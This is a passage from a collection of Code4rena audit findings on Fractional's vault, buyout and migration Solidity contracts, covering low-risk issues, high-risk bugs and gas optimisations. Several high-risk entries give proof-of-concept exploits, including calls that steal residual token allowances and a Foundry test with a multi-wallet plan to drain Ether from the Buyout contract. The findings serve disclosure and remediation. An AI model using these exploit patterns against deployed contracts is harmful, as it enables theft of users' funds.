`Migration.migrateFractions` function, check that `migrationInfo[_vault][_proposalId].fractionsMigrated == true` to ensure that the `Migration.settleFractions` has been executed.  ```diff function migrateFractions(address _vault, uint256 _proposalId) external { + // Fractional tokens must be minted first before migrating + require(migrationInfo[_vault][_proposalId].fractionsMigrated, \"Fractional token not minted yet\");     // Reverts if address is not a registered vault     (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);     if (id == 0) revert NotVault(_vault);     // Reverts if buyout state is not successful     (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(         _vault     );     State required = State.SUCCESS;     if (current != required) revert IBuyout.InvalidState(required, current);     // Reverts if proposer of buyout is not this contract     if (proposer != address(this)) revert NotProposalBuyout(); ```    ## 4.3 State Variable Visibility Is Not Set  #### Description  Visibility is not set for the `token` state variable.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Metadata.sol#L13  ```solidity /// @title Metadata /// @author Fractional Art /// @notice Utility contract for storing metadata of an FERC1155 token contract Metadata {     /// @notice Address of FERC1155 token contract     address immutable token; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/references/SupplyReference.sol#L12  ```solidity /// @title Supply /// @author Fractional Art /// @notice Reference implementation for the optimized Supply target contract contract SupplyReference is ISupply {     /// @notice Address of VaultRegistry contract     address immutable registry; ```  #### Recommendation  It is best practice to set the visibility of state variables explicitly. The default visibility for \"token\" is internal. Other possible visibility settings are public and private.    ## 4.4 Risk of Plugins  #### Description  All plugins' functions within the vault can be called by any public user. If the plugins contain any unprotected privileged functions, it can be called by malicious user.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L38  ```solidity /// @dev Callback for handling plugin transactions /// @param _data Transaction data /// @return response Return data from executing plugin // prettier-ignore fallback(bytes calldata _data) external payable returns (bytes memory response) {     address plugin = methods[msg.sig]; // @audit-issue what if we have the diff contract with same function name? Collision?     (,response) = _execute(plugin, _data); } ```  #### Recommendation  Include a warning in the comments or documentation so that the vault owner is aware that any plugin's function added can be called by the public users. Vault owners should ensure that plugin's functions have the necessary access control in place so that only authorised users can trigger the functions.    ## 4.5 Ether Might Stuck In `Vault.sol`  #### Description  If a user accidentally sent ether to the `Vault` contract, the ether will be stuck in the vault with no way to retrieve them.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L32  ```solidity /// @dev Callback for receiving Ether when the calldata is empty receive() external payable {} ```  #### Recommendation  Consider if there is a need for the `Vault` contract to receive ethers. Otherwise, remove it.    ## 4.6 Ownership May Be Burned  #### Description  It was observed that the vault owner can transfer the ownership to `address(0)`, which effectively burn the ownership.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93  ```solidity /// @notice Transfers ownership to given account /// @param _newOwner Address of new owner function transferOwnership(address _newOwner) external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender);     owner = _newOwner;     emit TransferOwnership(msg.sender, _newOwner); } ```  #### Recommendation  It is recommended to implement a validation check to ensure that the ownership is not transferred to `address(0)`.  ```diff function transferOwnership(address _newOwner) external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender); +   require(_newOwner != 0, \"Invalid new owner: address(0)\");     owner = _newOwner;     emit TransferOwnership(msg.sender, _newOwner); } ```    ## 4.7 Array Length Not Validated  #### Description  The `Vault.install` function did not validate that the length of `_selectors` and `_plugins` arrays is the same. If the array length is different, it might cause unexpected behavior.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73  ```solidity /// @notice Installs plugin by setting function selector to contract address /// @param _selectors List of function selectors /// @param _plugins Addresses of plugin contracts function install(bytes4[] memory _selectors, address[] memory _plugins)     external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender);     uint256 length = _selectors.length;     for (uint256 i = 0; i < length; i++) {         methods[_selectors[i]] = _plugins[i];     }     emit InstallPlugin(_selectors, _plugins); }  ```  #### Recommendation  It is recommended to implement validation to ensure that the length of `_selectors` and `_plugins` arrays is the same.  ```diff function install(bytes4[] memory _selectors, address[] memory _plugins)     external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender); +   require(_selectors.length == _plugins.length, \"Length of selectors and plugins is not the same\");     uint256 length = _selectors.length;     for (uint256 i = 0; i < length; i++) {         methods[_selectors[i]] = _plugins[i];     }     emit InstallPlugin(_selectors, _plugins); } ```    ## 4.8 Consider Two-Phase Ownership Transfer  #### Description  Owner can calls `Vault.transferOwnership` function to transfers the ownership to the new address directly. As such, there is a risk that the ownership is transferred to an invalid address, thus causing the contract to be without a owner.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93  ```solidity /// @notice Transfers ownership to given account /// @param _newOwner Address of new owner function transferOwnership(address _newOwner) external {     if (owner != msg.sender) revert NotOwner(owner, msg.sender);     owner = _newOwner;     emit TransferOwnership(msg.sender, _newOwner); } ```  Controller can calls `ERC1155.transferController` function to transfers the controller role to the new address directly. As such, there is a risk that the ownership is transferred to an invalid address, thus causing the contract to be without a controller.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L229  ```solidity /// @notice Updates the controller address for the FERC1155 token contract /// @param _newController Address of new controlling entity function transferController(address _newController)     external     onlyController {     if (_newController == address(0)) revert ZeroAddress();     _controller = _newController;     emit ControllerTransferred(_newController); } ```  ### Recommendation  Consider implementing a two step process where the owner or controller nominates an account and the nominated account needs to call an `acceptOwnership()` function for the transfer of admin to fully succeed. This ensures the nominated EOA account is a valid and active account.    ## 4.9 Migration Proposer Can Hijack Other User's Buyout To Settle A Vault  #### Description  `Migration.settleVault` function should only be callable if the buyout initiated by the migration proposal is successful. However, it was observed that it is possible to call `Migration.settleVault` successfully even though the buyout initiated by the migration proposal has failed.  The following aims to demonstrate the issue:  1. Alice (attacker) creates a migration proposal by calling `Migration.propose` function. Then, she calls `Migration.commit` to kick off the buyout process for the migration, and Alice's proposal's `isCommited` is set to `true`. 2. Alice's buyout is unsuccessful. At this point in time, note that Alice's proposal's `isCommited` still remains as `true`, and the vault state reverts back to `State.INACTIVE`. 3. In order for the `Migration.settleVault` function to run successfully, the following three (3) requirements must be met:    - 1st requirement - Proposal must be committed    - 2nd requirement - Vault state must be set to `status.SUCCESS`    - 3rd requirement - `proposal.newVault` must not be initialised, which means that new vault has not been deployed yet 4. If Alice attempts to call `Migration.settleVault` function, it will revert because the vault state is not set to `State.SUCCESS` due to the failed buyout. In summary, her migration proposal "}, {"title": "Malicious Users Can Exploit Residual Allowance To Steal Assets", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/468", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91   # Vulnerability details  ## Vulnerability Details  A depositor cannot have any residual allowance after depositing to the vault because the tokens can be stolen by anyone.  ## Proof-of-Concept  Assume that Alice has finished deploying the vault, and she would like to deposit her ERC20, ERC721, and ERC1155 tokens to the vault. She currently holds the following assets in her wallet  - `1000` XYZ ERC20 tokens - APE #1 ERC721 NFT, APE #2 ERC721 NFT, APE #3 ERC721 NFT,  - `1000` ABC ERC1155 tokens  Thus, she sets up the necessary approval to grant [`baseVault`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L17) contract the permission to transfer her tokens to the vault.  ```solidity erc20.approve(address(baseVault), type(uint256).max); erc721.setApprovalForAll(address(baseVault), true); erc1155.setApprovalForAll(address(baseVault), true); ```  Alice decided to deposit `50` XYZ ERC20 tokens, APE #1 ERC721 NFT, and `50` ABC tokens to the vault by calling `baseVault.batchDepositERC20`, `baseVault.batchDepositERC721`, and `baseVault.batchDepositERC1155` as shown below:  ```solidity baseVault.batchDepositERC20(alice.addr, vault, [XYZ.addr], [50]) baseVault.batchDepositERC721(alice.addr, vault, [APE.addr], [#1]) baseVault.batchDepositERC1155(alice.addr, vault, [ABC.addr], [#1], [50], \"\") ```  An attacker notices that there is residual allowance left on the `baseVault`, thus the attacker executes the following transactions to steal Alice's assets and send them to the attacker's wallet address.  ```solidity baseVault.batchDepositERC20(alice.addr, attacker.addr, [XYZ.addr], [950]) baseVault.batchDepositERC721(alice.addr, attacker.addr, [APE.addr, APE.addr], [#2, #3]) baseVault.batchDepositERC1155(alice.addr, attacker.addr, [ABC.addr], [#1], [950], \"\") ```  [https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58)  ```solidity function batchDepositERC20(     address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _amounts ) external {     for (uint256 i = 0; i < _tokens.length; ) {         IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]);         unchecked {             ++i;         }     } } ```  [https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77)  ```solidity function batchDepositERC721(     address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids ) external {     for (uint256 i = 0; i < _tokens.length; ) {         IERC721(_tokens[i]).safeTransferFrom(_from, _to, _ids[i]);         unchecked {             ++i;         }     } } ```  [https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91)  ```solidity function batchDepositERC1155(     address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids,     uint256[] calldata _amounts,     bytes[] calldata _datas ) external {     unchecked {         for (uint256 i = 0; i < _tokens.length; ++i) {             IERC1155(_tokens[i]).safeTransferFrom(                 _from,                 _to,                 _ids[i],                 _amounts[i],                 _datas[i]             );         }     } } ```  ## Impact  Lost of assets for users as a malicious user could utilise the `baseVault` contract to exploit the user's residual allowance to steal their assets.  ## Recommended Mitigation Steps  It is recommended to only allow the `baseVault.batchDepositERC20`, `baseVault.batchDepositERC721`, and `baseVault.batchDepositERC1155` functions to pull tokens from the caller (`msg.sender`).  Considering updating the affected functions to remove the `from` parameter, and use `msg.sender` instead.  ```diff function batchDepositERC20( -   address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _amounts ) external {     for (uint256 i = 0; i < _tokens.length; ) { -       IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]); +       IERC20(_tokens[i]).transferFrom(msg.sender, _to, _amounts[i]);         unchecked {             ++i;         }     } } ```  ```diff function batchDepositERC721( -   address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids ) external {     for (uint256 i = 0; i < _tokens.length; ) { -       IERC721(_tokens[i]).safeTransferFrom(_from, _to, _ids[i]); +       IERC721(_tokens[i]).safeTransferFrom(msg.sender, _to, _ids[i]);         unchecked {             ++i;         }     } } ```  ```diff function batchDepositERC1155( -   address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids,     uint256[] calldata _amounts,     bytes[] calldata _datas ) external {     unchecked {         for (uint256 i = 0; i < _tokens.length; ++i) {             IERC1155(_tokens[i]).safeTransferFrom( -               _from, +               msg.sender,                 _to,                 _ids[i],                 _amounts[i],                 _datas[i]             );         }     } } ```  "}, {"title": "Cash-out from a successful buyout allows an attacker to drain Ether from the `Buyout` contract", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/440", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L268-L269   # Vulnerability details  ## Impact  The function `Buyout.cash` allows a user to cash out proceeds (Ether) from a successful vault buyout.  However, due to how `buyoutShare` is calculated in `Buyout.cash`, users (fractional vault token holders) cashing out would receive more Ether than they are entitled to. The calculation is wrong as it uses the initial Ether balance stored in `buyoutInfo[_vault].ethBalance`. Each consecutive cash-out will lead to a user receiving more Ether, ultimately draining the Ether funds of the `Buyout` contract.  ## Proof of Concept  Copy paste the following test case into `Buyout.t.sol` and run the test via `forge test -vvv --match-test testCashDrainEther`:  The test shows how 2 users Alice and Eve cash out Ether from a successful vault buyout (which brought in `10 ether`). Alice and Eve are both entitled to receive `5 ether` each. Alice receives the correct amount when cashing out, however, due to a miscalculation of `buyoutShare` (see [#L268-L269](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L268-L269)), Eve can cash-out `10 ether` from the `Buyout` contract.  ```solidity function testCashDrainEther() public {   /// ==================   /// ===== SETUP =====   /// ==================    deployBaseVault(alice, TOTAL_SUPPLY);   (token, tokenId) = registry.vaultToToken(vault);   alice.ferc1155 = new FERC1155BS(address(0), 111, token);   bob.ferc1155 = new FERC1155BS(address(0), 222, token);   eve.ferc1155 = new FERC1155BS(address(0), 333, token);    buyout = address(buyoutModule);   proposalPeriod = buyoutModule.PROPOSAL_PERIOD();   rejectionPeriod = buyoutModule.REJECTION_PERIOD();    vm.label(vault, \"VaultProxy\");   vm.label(token, \"Token\");    setApproval(alice, vault, true);   setApproval(alice, buyout, true);   setApproval(bob, vault, true);   setApproval(bob, buyout, true);   setApproval(eve, vault, true);   setApproval(eve, buyout, true);    alice.ferc1155.safeTransferFrom(       alice.addr,       bob.addr,       1,       6000,       \"\"   );    alice.ferc1155.safeTransferFrom(       alice.addr,       eve.addr,       1,       2000,       \"\"   );   /// ==================   /// ===== SETUP END =====   /// ==================    /// Fraction balances:   assertEq(getFractionBalance(alice.addr), 2000); // Alice: 2000   assertEq(getFractionBalance(bob.addr), 6000); // Bob: 6000   assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000    bob.buyoutModule.start{value: 10 ether}(vault);    assertEq(getETHBalance(buyout), 10 ether);    /// Bob (proposer of buyout) transfered his fractions to buyout contract   assertEq(getFractionBalance(buyout), 6000);    vm.warp(rejectionPeriod + 1);    bob.buyoutModule.end(vault, burnProof);    /// Fraction balances after buyout ended:   assertEq(getFractionBalance(alice.addr), 2000);  // Alice: 2000   assertEq(getFractionBalance(bob.addr), 0); // Bob: 0   assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000    assertEq(getETHBalance(buyout), 10 ether);    /// Alice cashes out 2000 fractions -> 5 ETH (correct amount)   alice.buyoutModule.cash(vault, burnProof);    assertEq(getFractionBalance(alice.addr), 0);   assertEq(getETHBalance(alice.addr), 105 ether);    /// Eve cashes out 2000 fractions -> REVERTS (internally it calculates Eve would receive 10 ETH instead of the entitled 5 ETH). If the contract holds sufficient Ether from other successful buyouts, Eve would receive the full 10 ETH   eve.buyoutModule.cash(vault, burnProof); } ```  **Additionally** to the demonstrated PoC in the test case, an attacker could intentionally create vaults with many wallets and exploit the vulnerability:  1. Attacker deploys a vault with `10.000` fractions minted 2. 51% of fractions (`5.100`) are kept in the main wallet, all other fractions are distributed to 5 other self-controlled wallets (Wallets 1-5, `980` fractions each) 3. With the first wallet, the attacker starts a buyout with `10 ether` - fractions are transferred into the `Buyout` contract as well as `10 ether` 4. Attacker waits for `REJECTION_PERIOD` to elapse to call `Buyout.end` (51% of fractions are already held in the contract, therefore no need for voting) 5. After the successful buyout, the attacker uses the `Buyout.cash` function to cash out each wallet. Each subsequent cash-out will lead to receiving more Ether, thus stealing Ether from the `Buyout` contract:    1. Wallet 1 - `buyoutShare = (980 * 10 ) / (3920 + 980) = 2 ether` (`totalSupply = 3920` after burning `980` fractions from wallet 1)    2. Wallet 2 - `buyoutShare = (980 * 10 ) / (2940 + 980) = 2.5 ether` (`totalSupply = 2940` after burning `980` fractions from wallet 2)    3. Wallet 3 - `buyoutShare = (980 * 10 ) / (1960 + 980) = ~3.3 ether` (`totalSupply = 1960` after burning `980` fractions from wallet 3)    4. Wallet 4 - `buyoutShare = (980 * 10 ) / (980 + 980) = 5 ether` (`totalSupply = 980` after burning `980` fractions from wallet 4)    5. Wallet 5 - `buyoutShare = (980 * 10 ) / (0 + 980) = 10 ether` (`totalSupply = 0` after burning `980` fractions from wallet 5)  If summed up, cashing out the 5 wallets, the attacker receives `22.8 ether` in total. Making a profit of `12.8 ether`.  This can be repeated and executed with multiple buyouts and vaults at the same time as long as there is Ether left to steal in the `Buyout` contract.  ## Tools Used  Manual review  ## Recommended mitigation steps  Decrement `ethBalance` from buyout info `buyoutInfo[_vault].ethBalance -= buyoutShare;` in `Buyout.cash` (see `@audit-info` annotation):  ```solidity function cash(address _vault, bytes32[] calldata _burnProof) external {     // Reverts if address is not a registered vault     (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(         _vault     );     if (id == 0) revert NotVault(_vault);     // Reverts if auction state is not successful     (, , State current, , uint256 ethBalance, ) = this.buyoutInfo(_vault);     State required = State.SUCCESS;     if (current != required) revert InvalidState(required, current);     // Reverts if caller has a balance of zero fractional tokens     uint256 tokenBalance = IERC1155(token).balanceOf(msg.sender, id);     if (tokenBalance == 0) revert NoFractions();      // Initializes vault transaction     bytes memory data = abi.encodeCall(         ISupply.burn,         (msg.sender, tokenBalance)     );     // Executes burn of fractional tokens from caller     IVault(payable(_vault)).execute(supply, data, _burnProof);      // Transfers buyout share amount to caller based on total supply     uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);     uint256 buyoutShare = (tokenBalance * ethBalance) /         (totalSupply + tokenBalance);     buyoutInfo[_vault].ethBalance -= buyoutShare; // @audit-info decrement `ethBalance` by `buyoutShare`     _sendEthOrWeth(msg.sender, buyoutShare);     // Emits event for cashing out of buyout pool     emit Cash(_vault, msg.sender, buyoutShare); } ```   "}, {"title": "Migration's `leave` function allows leaving a committed proposal", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/379", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L141   # Vulnerability details  The `leave` function allows to leave a proposal even if the proposal has been committed and failed. This makes it a (probably unintended) duplicate functionality of `withdrawContributions`, which is the function that should be used to withdraw failed contributions.  ## Impact User assets might be lost: When withdrawing assets from a failed migration, users should get back a different amount of assets, according to the buyout auction result. (I detailed this in another issue - \"Migration::withdrawContribution falsely assumes that user should get exactly his original contribution back\"). But when withdrawing assets from a proposal that has not been committed, users should get back their original amount of assets, as that has not changed. Therefore, if `leave` does not check if the proposal has been committed, users could call `leave` instead of `withdrawContribution` and get back a different amounts of assets than they deserve, on the expense of other users.  ## Proof of Concept The `leave` function [does not check](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L141) anywhere whether `proposal.isCommited == true`. Therefore, if a user calls it after a proposal has been committed and failed, it will continue to send him his original contribution back, instead of sending him the adjusted amount that has been returned from Buyout.  ## Recommended Mitigation Steps Revert in `leave` if `proposal.isCommited == true`. You might be also able to merge the functionality of `leave` and `withdrawContribution`, but that depends on how you will implement the fix for `withdrawContribution`.  "}, {"title": "Migration::withdrawContribution falsely assumes that user should get exactly his original contribution back", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/375", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L308 https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L321 https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L312 https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L325   # Vulnerability details  When a user calls `withdrawContribution`, it will try to send him back his original contribution for the proposal. But if the proposal has been committed, and other users have interacted with the buyout, Migration will receive back a different amount of ETH and tokens. Therefore it shouldn't send the user back his original contribution, but should send whatever his share is of whatever was received back from Buyout.  ## Impact Loss of funds for users. Some users might not be able to withdraw their contribution at all, and other users might withdraw funds that belong to other users. (This can also be done as a purposeful attack.)  ## Proof of Concept A summary is described at the top.  It's probably not needed, but the here's the flow in detail. When a user joins a proposal, Migration [saves](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L124:#L135) his contribution: ```         userProposalEth[_proposalId][msg.sender] += msg.value;         userProposalFractions[_proposalId][msg.sender] += _amount; ``` Later when the user would want to withdraw his contribution from a failed migration, Migration would [refer](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L308:#L325) to these same variables to decide how much to send to the user: ```         uint256 userFractions = userProposalFractions[_proposalId][msg.sender];         IFERC1155(token).safeTransferFrom(address(this), msg.sender, id, userFractions, \"\");         uint256 userEth = userProposalEth[_proposalId][msg.sender];         payable(msg.sender).transfer(userEth); ```  But if the proposal was committed, and other users interacted with the buyout, then the amount of ETH and tokens that Buyout sends back is not the same contribution. For example, if another user called `buyFractions` for the buyout, it [will decrease](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L168) the amount of tokens in the pool: ```         IERC1155(token).safeTransferFrom(address(this), msg.sender, id, _amount, \"\"); ``` And when the proposal will end, if it has failed, Buyout will [send back](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L228) to Migration [the amount](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L206) of tokens in the pool: ```         uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id);         ...         IERC1155(token).safeTransferFrom(address(this), proposer, id, tokenBalance, \"\"); ``` (**Same will happen for the ETH amount)  Therefore, Migration will receive back less tokens than the original contribution was. When the user will try to call `withdrawContribution` to withdraw his contribution from the pool, Migration would [try to send](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L310) the user's original contribution. But there's a deficit of that. If other users have contributed the same token, then it will transfer their tokens to the user. If not, then the withdrawal will simply revert for insufficient balance.  ## Recommended Mitigation Steps I am not sure, but I think that the correct solution would be that upon a failed proposal's end, there should be a hook call from Buyout to the proposer - in our situation, Migration. Migration would then see(/receive as parameter) how much ETH/tokens were received, and update the proposal with the change needed. eg. send to each user 0.5 his tokens and 1.5 his ETH. In another issue I submitted, \"User can't withdraw assets from failed migration if another buyout is going on/succeeded\", I described for a different reason why such a callback to Migration might be needed. Please see there for more implementation suggestion. I think this issue shows that indeed it is needed.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/370", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "### [G01] Custom Errors There are a couple of files that have yet to be upgraded to custom errors. Based on the following test in remix you can save 12,404 in deployment costs per custom error and 86 gas on each function call.  ```  contract Test {  uint256 a;  function check() external {   require(a != 0, \"check failed\");  } }   (Deployment cost: 114,703, Cost on Function call: 23,392) vs  contract Test {  uint256 a;  error checkFailed();  function check() external {   if (a != 0) revert checkFailed();  } }   (Deployment cost: 102,299, Cost on Function call: 23,306) ```  Instances where custom errors can be implemented: [FERC1155.sol#L263-L268](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L263-L268) [FERC1155.sol#L275-L286](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L275-L286) [FERC1155.sol#L297](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L297) [MerkleBase.sol#L62](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62) [MerkleBase.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78)   ### [G02] Shorten Revert Messages If you opt not to use custom errors keeping revert strings <= 32 bytes in length will save gas.  I ran a test in remix and found the savings for a single short revert string vs long string to be 9,377 gas in deployment cost and 18 gas on function call.  ``` solidity contract Test {  uint256 a;  function check() external {   require(a != 0, \"short error message\");    (Deployment cost: 114,799, Cost on function call: 23,392)    vs    require(a != 0, \"A longer Error Message over 32 bytes in              length\");    (Deployment cost: 124,176, Cost on function call: 23,410)   } } ```  I recommend shortenning the following revert strings to < 32 bytes in length: [MerkleBase.sol#L62](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62) [MerkleBase.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78)   ### [G03] Loop Optimisation When incrementing i in for loops there is no chance of overflow so unchecked can be used to save gas. Pre increments can also be used to save a small amount of gas per iteration (~5 gas). I ran a simple test in remix and found deployment savings of 31,901 gas and on each function call saved ~144 gas per iteration.  ``` solidity contract Test {  function loopTest() external {   for (uint256 i; i < 1; i++) {   Deployment Cost: 125,885, Cost on function call: 24,604   vs   for (uint256 i; i < 1; ) {   // for loop body   unchecked { ++i; }   Deployment Cost: 93,984, Cost on function call: 24,460   }  } } ```  For loops that can use unchecked/pre increments: [Vault.sol#L104](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L104)   ### [G04] State Variables that can be Immutable Variables that are initialised in the constructor and then never modified can be changed to immutable. Based on the following test in remix switching to immutable variables can save 26,376 in deployment costs and 2,456 whenever referencing the variable.  ``` solidity contract Test {  address public supply;   (Deployment Cost: 167,940, Cost on function call: 26,861)  vs  address public immutable supply;  (Deployment Cost: 141,564, Cost on function call: 24,405)   constructor(address _supply) {   supply = _supply;  }    function test() external {   address testAddress = supply; // to test referencing gas costs  } } ```  Variables that can be changed to immutable: [Buyout.sol#L29-L33](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L29-L33) - registry, supply & transfer are all set in the constructor and never modified. [Minter.sol#L14](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L14) - supply is never modified [Migration.sol#L37-L39](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L37-L39) - buyout & registry are never modified [VaultFactory.sol#L15](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L15) - implementation is never modified   ### [G05] x = x + y is Cheaper than x += y  Based on test in remix you can save ~1,007 gas on deployment and ~15 gas on execution cost if you use x = x + y over x += y. (Is only true for storage variables)  ``` solidity contract Test {  uint256 x = 1;  function test() external {   x += 3;    (Deployment Cost: 153,124, Execution Cost: 30,369)   vs   x = x + 1;   (Deployment Cost: 152,117, Execution Cost: 30,354)  }  } ```  Instances where x = x + y/x = x - y can be implemented: [FERC1155.sol#L62](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L62) [FERC1155.sol#L86](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L86) [Buyout.sol#L139](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L139) [Buyout.sol#L176](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L176) [Migration.sol#L123-L124](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L123-L124) [Migration.sol#L134-L135](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L134-L135)  [Migration.sol#L156](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L156) [Migration.sol#L160](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L160)   ### [G06] Minimise SLOAD's Whenever referencing a state variable more than once in a function without modifying it, you can save ~97 gas per use by caching the value. (normally 100 gas each use vs 103 gas to SLOAD/MSTORE for the first use and then only 3 gas for further uses)  [FERC1155.sol#L246-L247](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L246-L247) - can cache royaltyPercent[_ id])(save ~94 gas) 